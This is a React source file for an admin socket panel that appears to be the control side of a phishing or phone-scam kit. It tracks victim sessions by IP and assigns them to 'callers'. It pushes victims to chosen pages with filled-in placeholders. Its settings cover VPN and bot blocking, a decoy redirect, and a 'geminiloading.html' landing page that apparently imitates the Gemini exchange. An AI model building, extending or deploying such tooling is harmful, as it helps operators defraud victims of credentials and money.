import React, { createContext, useContext, useEffect, useState } from 'react';
import { io } from 'socket.io-client';
import { useAuth } from './AuthContext.jsx';

// Context creation
const AdminSocketContext = createContext(null);

// Get the server URL based on environment
const getServerUrl = () => {
  // In the browser, always use the current origin so we hit the same host as the served app
  if (typeof window !== 'undefined' && window.location?.origin) {
    return window.location.origin;
  }
  // Fallbacks for non-browser contexts
  return import.meta.env.VITE_SOCKET_URL || 'http://localhost:3000';
};

// Provider Component
function AdminSocketProvider({ children }) {
  const [socket, setSocket] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [sessions, setSessions] = useState([]);
  const [settings, setSettings] = useState({
    websiteEnabled: true,
    redirectUrl: 'https://google.com',
    vpnBlockEnabled: false,
    antiBotEnabled: false,
    defaultLandingPage: 'geminiloading.html',
    captchaEnabled: false,
    showAliases: false,
    availablePages: []
  });
  const [bannedIPs, setBannedIPs] = useState(new Set());
  const [callers, setCallers] = useState([]);
  const [aliases, setAliases] = useState({});

  const { isAuthenticated, userRole, currentUser } = useAuth();

  useEffect(() => {
    const serverUrl = getServerUrl();
    console.log('[AdminSocket] Initializing socket connection...');
    console.log('[AdminSocket] Server URL:', serverUrl);
    console.log('[AdminSocket] Environment:', process.env.NODE_ENV);

    if (!isAuthenticated) {
      console.log('[AdminSocket] Skipping connect: not authenticated');
      setIsConnected(false);
      if (socket) {
        socket.disconnect();
        setSocket(null);
      }
      return;
    }

    const authData = JSON.parse(localStorage.getItem('adminAuth') || '{}');
    const authToken = authData.token;
    const role = authData.role || userRole || 'admin';
    const username = authData.username || currentUser || 'Admin';

    if (!authToken) {
      console.warn('[AdminSocket] No token found; aborting connection');
      return;
    }

    const newSocket = io(`${serverUrl}/admin`, {
      path: '/socket.io',
      transports: ['websocket', 'polling'],
      auth: {
        token: authToken,
        role,
        username
      },
      withCredentials: true,
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      reconnectionAttempts: Infinity,
      upgrade: true
    });

    newSocket.on('connect', () => {
      console.log('[AdminSocket] ✓ Connected to admin socket');
      setIsConnected(true);
    });

    newSocket.on('disconnect', (reason) => {
      console.log('[AdminSocket] ✗ Disconnected from admin socket. Reason:', reason);
      setIsConnected(false);
    });

    newSocket.on('connect_error', (error) => {
      console.error('[AdminSocket] Connection error:', error.message || error);
    });

    newSocket.on('error', (error) => {
      console.error('[AdminSocket] Socket error:', error);
    });

    newSocket.on('session_created', (session) => {
      setSessions(prev => [...prev, session]);
    });

    newSocket.on('session_updated', (updatedSession) => {
      setSessions(prev => prev.map(session => 
        session.id === updatedSession.id ? updatedSession : session
      ));
    });

    newSocket.on('session_removed', (sessionId) => {
      console.log('Session removed:', sessionId);
      setSessions(prev => prev.filter(session => session.id !== sessionId));
    });

    newSocket.on('session_remove_success', ({ sessionId }) => {
      console.log('Session successfully removed:', sessionId);
      setSessions(prev => prev.filter(session => session.id !== sessionId));
    });

    newSocket.on('session_remove_error', ({ sessionId, error }) => {
      console.error('Failed to remove session:', sessionId, error);
    });

    newSocket.on('sessions_cleared', () => {
      console.log('All sessions cleared');
      setSessions([]);
    });

    newSocket.on('session_assigned', ({ sessionId, caller }) => {
      setSessions(prev => prev.map(session =>
        session.id === sessionId ? { ...session, assignedTo: caller } : session
      ));
    });

    newSocket.on('session_unassigned', ({ sessionId }) => {
      setSessions(prev => prev.map(session =>
        session.id === sessionId ? { ...session, assignedTo: null } : session
      ));
    });

    newSocket.on('assignment_error', ({ error }) => {
      console.error('Assignment error:', error);
      alert(error);
    });

    newSocket.on('assignments_cleared', ({ caller, count }) => {
      console.log(`Assignments cleared for ${caller}: ${count} sessions`);
      setSessions(prev => prev.map(session =>
        session.assignedTo === caller ? { ...session, assignedTo: null } : session
      ));
    });

    newSocket.on('settings_updated', (newSettings) => {
      setSettings(newSettings);
    });

    newSocket.on('ip_banned', (ip) => {
      setBannedIPs(prev => new Set([...prev, ip]));
    });

    newSocket.on('ip_unbanned', (ip) => {
      setBannedIPs(prev => {
        const newSet = new Set(prev);
        newSet.delete(ip);
        return newSet;
      });
    });

    newSocket.on('init', (data) => {
      setSessions(data.sessions || []);
      setSettings(data.settings || {});
      setBannedIPs(new Set(data.bannedIPs || []));
      setCallers(data.callers || []);
      setAliases(data.aliases || {});
    });

    newSocket.on('caller_added', (caller) => {
      setCallers(prev => [...prev, caller]);
    });

    newSocket.on('caller_updated', (updatedCaller) => {
      setCallers(prev => prev.map(c =>
        c.id === updatedCaller.id ? updatedCaller : c
      ));
    });

    newSocket.on('caller_deleted', (id) => {
      setCallers(prev => prev.filter(c => c.id !== id));
    });

    newSocket.on('alias_updated', ({ sessionId, alias }) => {
      setAliases(prev => ({
        ...prev,
        [sessionId]: alias
      }));
    });

    newSocket.on('redirect_error', ({ error, sessionId }) => {
      console.error(`Redirect failed for session ${sessionId}: ${error}`);
      alert(`Redirect failed: ${error}`);
    });

    newSocket.on('force_logout', ({ reason }) => {
      console.log('Force logout received:', reason);
      localStorage.removeItem('adminAuth');
      window.location.href = '/admin';
    });

    setSocket(newSocket);

    return () => {
      newSocket.disconnect();
    };
  }, [isAuthenticated, userRole, currentUser]);

  // Caller management functions
  const addCaller = (callerData) => {
    socket?.emit('add_caller', callerData);
  };

  const updateCaller = (id, updatedData) => {
    socket?.emit('update_caller', { id, data: updatedData });
  };

  const deleteCaller = (id) => {
    socket?.emit('delete_caller', id);
  };

  // Alias management functions
  const setAlias = (sessionId, alias) => {
    socket?.emit('set_alias', { sessionId, alias });
  };

  const getAlias = (sessionId) => {
    return aliases[sessionId] || sessionId.slice(0, 8);
  };

  const value = {
    socket,
    isConnected,
    sessions,
    settings,
    bannedIPs,
    callers,
    addCaller,
    updateCaller,
    deleteCaller,
    aliases,
    setAlias,
    getAlias,
    updateSettings: (newSettings) => {
      socket?.emit('update_settings', newSettings);
    },
    removeSession: (sessionId) => {
      socket?.emit('remove_session', { sessionId });
    },
    redirectUser: (sessionId, targetPage, placeholders = {}) => {
      socket?.emit('redirect_user', { sessionId, page: targetPage, placeholders });
    },
    banIP: (ip) => {
      socket?.emit('ban_ip', ip);
    },
    unbanIP: (ip) => {
      socket?.emit('unban_ip', ip);
    },

    clearSessions: () => {
      console.log('Clearing all sessions');
      socket?.emit('clear_sessions');
    },
    assignSession: (sessionId, caller) => {
      socket?.emit('assign_session', { sessionId, callerId: caller });
    },
    unassignSession: (sessionId) => {
      socket?.emit('unassign_session', { sessionId });
    },
    getSession: (sessionId) => sessions.find(s => s.id === sessionId),
    isIPBanned: (ip) => bannedIPs.has(ip),
    getActiveSessions: () => sessions.filter(s => s.connected),
    getSessionCount: () => sessions.length,
    getActiveSessionCount: () => sessions.filter(s => s.connected).length,
    isSessionActive: (sessionId) => {
      const session = sessions.find(s => s.id === sessionId);
      return session?.connected || false;
    },
    getSessionIP: (sessionId) => {
      const session = sessions.find(s => s.id === sessionId);
      return session?.ip;
    },
    getSessionsByIP: (ip) => sessions.filter(s => s.ip === ip),
  };

  return (
    <AdminSocketContext.Provider value={value}>
      {children}
    </AdminSocketContext.Provider>
  );
}

// Hook definition
function useAdminSocket() {
  const context = useContext(AdminSocketContext);
  if (!context) {
    throw new Error('useAdminSocket must be used within an AdminSocketProvider');
  }
  return context;
}

// Named exports for both the Provider and hook
export { AdminSocketProvider, useAdminSocket };